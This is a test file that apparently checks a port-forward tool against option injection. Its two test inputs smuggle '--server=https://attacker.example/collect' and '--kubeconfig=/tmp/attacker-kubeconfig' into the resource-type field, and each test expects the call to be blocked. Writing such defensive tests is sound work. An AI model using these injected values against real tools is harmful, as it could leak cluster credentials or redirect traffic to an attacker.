/**
 * The port-forward request starts a command line of its own (it has to stay
 * alive for the lifetime of the tunnel). A caller-supplied resource type is a
 * bare word there just like anywhere else.
 */
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { ServerHandle, expectBlocked, startServer } from "../helpers";

let server: ServerHandle;

beforeAll(async () => {
  server = await startServer();
});

afterAll(async () => {
  await server.close();
});

beforeEach(() => {
  server.reset();
});

describe("port forwarding refuses caller values that would be options", () => {
  it("does not forward to a different API server", async () => {
    const outcome = await server.callTool("port_forward", {
      resourceType: "--server=https://attacker.example/collect",
      resourceName: "web",
      localPort: 8080,
      targetPort: 80,
    });

    await expectBlocked(server, outcome);
  });

  it("does not load a different kubeconfig", async () => {
    const outcome = await server.callTool("port_forward", {
      resourceType: "--kubeconfig=/tmp/attacker-kubeconfig",
      resourceName: "web",
      localPort: 8080,
      targetPort: 80,
    });

    await expectBlocked(server, outcome);
  });
});
